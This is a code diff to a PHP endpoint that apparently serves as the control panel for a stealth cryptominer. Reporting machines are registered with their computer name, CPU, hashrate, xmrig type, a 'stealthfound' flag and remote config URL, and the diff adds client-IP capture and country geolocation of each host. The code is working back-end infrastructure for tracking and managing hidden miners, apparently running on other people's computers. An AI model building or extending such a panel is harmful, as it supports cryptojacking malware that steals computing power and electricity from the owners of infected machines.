@@ -8,7 +8,8 @@ if(json_last_error() != JSON_ERROR_NONE) {
     die();
 }
 
-$hostAddress = $_SERVER["REMOTE_ADDR"] ?? '127.0.0.1';
+$headers = getallheaders();
+$hostAddress = $headers['CF-Connecting-IP'] ?? $_SERVER["REMOTE_ADDR"] ?? '127.0.0.1';
 $stmt = getConn()->prepare("SELECT 1 FROM ipblocking WHERE ipb_ip = ? LIMIT 1");
 $blocked = $stmt->execute([$hostAddress]) && $stmt->fetch();
 $stmt->closeCursor();
@@ -26,6 +27,9 @@ $uqhash = substr(md5(getData('computername').getData('cpu')), 0, 16);
 $type = getData('type');
 $id = getData('id');
 $hashrate = round(is_numeric(getData('hashrate')) ? getData('hashrate') : 0.0, 2);
+
+//Retrieves the IP address as data. Use this only for testing purposes or creating fake data.
+//$hostAddress = getData('ip');
 
 $fields = [
     'ms_ip'=>$hostAddress,
@@ -47,7 +51,8 @@ $fields = [
     'ms_stealthfound'=>getData('stealthfound'),
     'ms_remoteURL'=>getData('remoteconfig'),
     'ms_extra'=>getData('extradata'),
-    'ms_lastConnection'=>date('Y-m-d H:i:s')
+    'ms_lastConnection'=>time(),
+    'ms_country'=>$headers['CF-IPCountry'] ?? 'Unknown'
 ];
 
 try {
@@ -71,6 +76,15 @@ try {
             $s->closeCursor();
         }
     } else {
+        if($fields['ms_country'] == 'Unknown'){
+            $minerCountry = @file_get_contents('https://api.country.is/'.$hostAddress);
+            if (!($minerCountry === FALSE)){
+                $fields['ms_country'] = json_decode($minerCountry, true)['country'] ?? 'Unknown';
+            }
+        }
+
+        $fields['ms_creationDate'] = $fields['ms_lastConnection'];
+
         $s = getConn()->prepare("INSERT INTO miners (ms_uqhash, ms_rid, ms_type, ms_config, ".implode(', ', array_keys($fields)).") VALUES (?, ?, ?, ?".str_repeat(", ?", count($fields)).")");
         $s->execute(array_merge([$uqhash, $id, $type, ($type == 'xmrig' ? 1 : 2)], array_values($fields)));
         $minerID = getConn()->lastInsertId();
@@ -87,6 +101,8 @@ try {
         $addHistory->execute([$minerID, getData('algo'), floor($hashrate), strtotime(date('Y-m-d H:i:00'))]);
         $addHistory->closeCursor();
     }
+
+    require_once dirname(__DIR__).'/plus/plusCalls.php';
 }
 catch(PDOException $e) {
     if($config['errorlog_enable']) {
